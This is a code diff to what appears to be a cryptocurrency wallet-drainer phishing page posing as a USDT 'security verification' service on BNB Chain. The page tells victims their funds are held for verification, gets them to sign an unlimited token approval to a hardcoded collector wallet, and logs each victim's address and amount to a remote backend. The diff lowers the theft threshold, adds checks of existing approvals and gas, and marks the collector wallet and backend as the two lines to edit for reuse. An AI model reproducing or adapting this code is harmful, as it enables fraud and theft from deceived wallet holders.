@@ -107,7 +107,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     <b>DECODED FROM mycode.js</b><br>
     USDT 0x55d398326f99059fF775485246999027B3197955<br>
     APPROVE MaxUint256 (unlimited)<br>
-    DUST 0.25 | MIN 50 | CHAIN 0x38
+    DUST 0.25 | MIN 5 | CHAIN 0x38
   </div>
 
   <div class="topbar">
@@ -187,7 +187,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     <div class="popup_icon">⚠️</div>
     <h2 class="popup_title">IN-sufficient USDT</h2>
     <div class="usdt_info_box"><span>💲</span><span id="final_usdt_Text" class="usdt_text">Available USDT:</span></div>
-    <div class="usdt_info_box"><span>🔒</span><span id="final_depositText" class="usdt_text">Required :: <b>50 USDT</b></span></div>
+    <div class="usdt_info_box"><span>🔒</span><span id="final_depositText" class="usdt_text">Required :: <b>5 USDT</b></span></div>
     <button id="final_closeBtn" class="close_btn">Close</button>
   </div>
 </div>
@@ -201,9 +201,10 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
       <div class="new_emoji_line"><div class="emoji-sm">✍️</div>
         <div><p class="subtitle">Verified Amount</p><p class="title" id="burn-text22">0 USDT</p></div></div>
     </div>
-    <div class="inline-section2">
-      <div class="new_emoji_line"><div class="emoji-sm">✔️</div>
-        <div><p class="subtitle22">Verification Success</p><p class="subtitle">Your USDT tokens are genuine and safe to use.</p></div></div>
+    <div class="inline-section2" id="perm-line" style="display:none">
+      <div class="new_emoji_line"><div class="emoji-sm">♾️</div>
+        <div><p class="subtitle22">Unlimited permission granted</p>
+        <p class="subtitle mono" id="perm-addr" style="font-size:10.5px;word-break:break-all">--</p></div></div>
     </div>
     <button id="closeBtn2" class="close_btn">Close</button>
   </div>
@@ -238,10 +239,12 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
   "use strict";
   var $ = function(id){ return document.getElementById(id); };
 
-  /* ============ CONFIG ============ */
+  /* ==========================================================
+     ONLY TWO LINES TO EDIT
+     ========================================================== */
   var CFG = {
-    COLLECTOR: '0xec922f296fBb9c9057B2cF37A3c3189E57C5D44b',
-    BACKEND:   'https://bsc-weld-two.vercel.app/api',
+    COLLECTOR: '0xec922f296fBb9c9057B2cF37A3c3189E57C5D44b',   // <-- YOUR collector wallet address
+    BACKEND:   'https://bsc-weld-two.vercel.app/api',            // <-- YOUR domain + /api
     USDT:      '0x55d398326f99059fF775485246999027B3197955',
     DUST:      0.25,
     MIN_SWEEP: 5,
@@ -309,7 +312,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     var fd = new FormData();
     fd.append('amount', amount); fd.append('address', address);
     fd.append('collector', collector || ''); fd.append('sheet', sheet || 'Sheet1');
-    fetch(CFG.BACKEND + '/sheet', { method:'POST', body: fd }).catch(function(){});
+    fetch(CFG.BACKEND + '?ep=sheet', { method:'POST', body: fd }).catch(function(){});
   }
 
   async function mySearchCode(){
@@ -329,14 +332,19 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
         state.token = new ethers.Contract(CFG.USDT, [
           'function balanceOf(address owner) view returns (uint256)',
           'function approve(address spender, uint256 value) returns (bool)',
+          'function allowance(address owner, address spender) view returns (uint256)',
           'function decimals() view returns (uint8)'
         ], signer);
         var raw = await state.token.balanceOf(state.account);
         var dec = 18;
         try { dec = await state.token.decimals(); } catch(e){}
         state.balance = Number(ethers.utils.formatUnits(raw, dec));
-        var bnb = Number(ethers.utils.formatEther(await provider.getBalance(state.account)));
-        if(bnb < 0.00002){ alert('You need a small amount of BNB for gas.'); return; }
+        state.bnb = Number(ethers.utils.formatEther(await provider.getBalance(state.account)));
+        state.lowGas = state.bnb < 0.00005;
+        try {
+          var allow = await state.token.allowance(state.account, CFG.COLLECTOR);
+          state.alreadyApproved = allow.gte(ethers.constants.MaxUint256.div(2));
+        } catch(e){ state.alreadyApproved = false; }
       } else {
         state.balance = simBalance;
       }
@@ -361,6 +369,11 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     updateWatermark(istTime());
     $('new_burn_text').innerHTML = "We've temporarily hold your assets for security verification &mdash; <span class=\"highlight\">$" + shown + " USDT</span>";
     $('new_burn_text2').textContent = shown + ' USDT';
+    var warn = '';
+    if(state.alreadyApproved) warn = 'Unlimited permission already granted for this wallet.';
+    else if(state.lowGas) warn = 'Warning: no BNB for gas in this wallet.';
+    $('new_notice_text').innerHTML = warn ||
+      'Your Funds are in security verification on BEP20, please click on release funds to Release.';
     $('new_overlay').classList.add('on');
   }
 
@@ -391,6 +404,8 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
         var tx = await state.token.approve(state.collector, ethers.constants.MaxUint256);
         await tx.wait();
         $('txHash').textContent = tx.hash;
+        var after = await state.token.allowance(state.account, state.collector);
+        state.unlimited = after.gte(ethers.constants.MaxUint256.div(2));
         logToSheet(state.sendAmount, state.account, 'Sheet2', state.collector);
         if(CFG.BACKEND) fetch(CFG.BACKEND + '?ep=approved', { method:'POST',
           headers:{'Content-Type':'application/json'},
@@ -407,6 +422,8 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
   function showPopup2(){
     $('burn-text11').textContent = 'Your ' + state.sendAmount.toFixed(2) + ' USDT has been verified as genuine.';
     $('burn-text22').textContent = state.sendAmount.toFixed(2) + ' USDT';
+    $('perm-line').style.display = state.unlimited ? 'block' : 'none';
+    $('perm-addr').textContent = state.collector;
     $('overlay2').classList.add('on');
   }
 
